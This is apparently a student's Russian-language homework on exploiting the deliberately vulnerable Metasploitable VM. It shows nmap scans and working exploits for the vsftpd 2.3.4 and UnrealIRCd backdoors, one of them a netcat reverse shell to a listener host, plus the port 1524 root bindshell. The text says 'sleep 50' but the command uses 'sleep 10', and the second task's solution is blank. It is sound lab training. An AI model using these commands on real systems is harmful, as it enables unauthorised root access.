# Домашнее задание к занятию «Уязвимости и атаки на информационные системы»

### Задание 1

Скачайте и установите виртуальную машину Metasploitable: https://sourceforge.net/projects/metasploitable/.

Это типовая ОС для экспериментов в области информационной безопасности, с которой следует начать при анализе уязвимостей.

Просканируйте эту виртуальную машину, используя **nmap**.

Попробуйте найти уязвимости, которым подвержена эта виртуальная машина.

Сами уязвимости можно поискать на сайте https://www.exploit-db.com/.

Для этого нужно в поиске ввести название сетевой службы, обнаруженной на атакуемой машине, и выбрать подходящие по версии уязвимости.

Ответьте на следующие вопросы:

- Какие сетевые службы в ней разрешены?
- Какие уязвимости были вами обнаружены? (список со ссылками: достаточно трёх уязвимостей)
  
*Приведите ответ в свободной форме.*  

### Решение 1

Сканируем виртуальную машину Metasploitable, используя **nmap**.
```python
sudo nmap -sS 192.168.160.128
```
![alt text](image.png)

```python
nmap -sV 192.168.160.128
```
![alt text](image-1.png)

Запустим также с параметром `script vuln`:
```python
nmap -sV --script vuln 192.168.160.128
```

Разбор команд:
nmap: Запуск программы.
-sV: (Service Version) Определить версии запущенных сервисов (так как уязвимости зависят от версий).
--script vuln: Запустить набор скриптов, которые проверяют найденные сервисы на наличие известных уязвимостей.
192.168.160.128: IP-адрес Metasploitable машины.

![alt text](image-2.png)

- Какие сетевые службы в ней разрешены?
На основе вывода nmap, на машине запущено большое количество различных сетевых служб:

Файловые серверы: FTP (порты 21 и 2121), NFS (порт 2049), Samba/NetBIOS (порты 139 и 445).

Удаленное управление: SSH (порт 22), Telnet (порт 23), Rlogin/Rexec (порты 512, 513), VNC (порт 5900).

Веб-серверы: Apache httpd (порт 80), Apache Tomcat (порт 8180).

Базы данных: MySQL (порт 3306), PostgreSQL (порт 5432).

Почта: SMTP Postfix (порт 25).

Прочее: DNS (порт 53), IRC (порт 6667), Java RMI (порт 1099) и спец порт с открытой консолью (1524).


- Какие уязвимости были вами обнаружены? (список со ссылками: достаточно трёх уязвимостей)
Уязвимости Metasploitable:
1. vsftpd 2.3.4 — Backdoor Command Execution

На порту 21 работает FTP-сервер версии vsftpd 2.3.4. В исходном коде этой конкретной версии существует известный бэкдор. Если при подключении указать имя пользователя, заканчивающееся на смайлик :) (например, user:)), сервер открывает шелл с правами root на порту 6200.

Ссылка на Exploit-DB: https://www.exploit-db.com/exploits/17491
Тип: Удаленное выполнение кода (RCE).
Воспроизводим:

Терминал1:
telnet 192.168.160.128 21
ответ: 220 (vsFTPd 2.3.4)
USER user:)
ответ: 331 Please specify the password.
PASS 123
![alt text](image-3.png)

Терминал2:
nc 192.168.160.128 6200
/usr/bin/whoami
ответ: root
/usr/bin/id
ответ: uid=0(root) gid=0(root)
/sbin/ifconfig
ответ: ..net addr:192.168.160.128  Bcast:192.168.160.255  Mask:255.255.255.0..
![alt text](image-4.png)


2. UnrealIRCd 3.2.8.1 — Backdoor Command Execution

На порту 6667 работает IRC-сервер UnrealIRCd (3.2.8.1). В этой версии также был бэкдор в архиве с исходным кодом. Отправка определенной команды серверу позволяет выполнять произвольные команды в системе.

Ссылка на Exploit-DB: https://www.exploit-db.com/exploits/16922
Тип: Удаленное выполнение кода (RCE).
Воспроизводим:
Выполним команду sleep 50:
```python
echo "AB; sleep 10" | nc 192.168.160.128 6667
```
Если терминал зависнет на 50 секунд перед тем как отключиться — значит, сервер выполнил команду sleep 50.
![alt text](image-5.png)
Терминал завис на 50 сек.
![alt text](image-6.png)
Терминал снова готов к работе. Проверка успешно завершена. Бэкдор слепой, поэтому простого способа увидеть ответ сервера нет. Для полноценного управления можно использовать Reverse Shell (Обратный шелл).

Воспроизводим:
Терминал1:
Запускаем слушателя на порту 4444 и ждем обратного подключения
```python
nc -lvnp 4444
```
![alt text](image-8.png)

Терминал2:
```python
echo "AB; nc -e /bin/sh 172.23.38.117 4444" | nc 192.168.160.128 6667
```
Проверяем подключение:
Listening on 0.0.0.0 4444
whoami
ответ: root
id
ответ: uid=0(root) gid=0(root)
hostname
ответ: metasploitable
![alt text](image-7.png)


3. Cамая очевидная "дыра": порт 1524/tcp, который nmap определил как bindshell с описанием Metasploitable root shell. Это не уязвимость программного обеспечения, а намеренно оставленный открытым "черный ход".
Воспроизводим:
```python
nc 192.168.160.128 1524
```
![alt text](image-10.png)
Получаем права суперпользователя (root) без пароля.


### Задание 2

Проведите сканирование Metasploitable в режимах SYN, FIN, Xmas, UDP.

Запишите сеансы сканирования в Wireshark.

Ответьте на следующие вопросы:

- Чем отличаются эти режимы сканирования с точки зрения сетевого трафика?
- Как отвечает сервер?

*Приведите ответ в свободной форме.*

### Решение 2
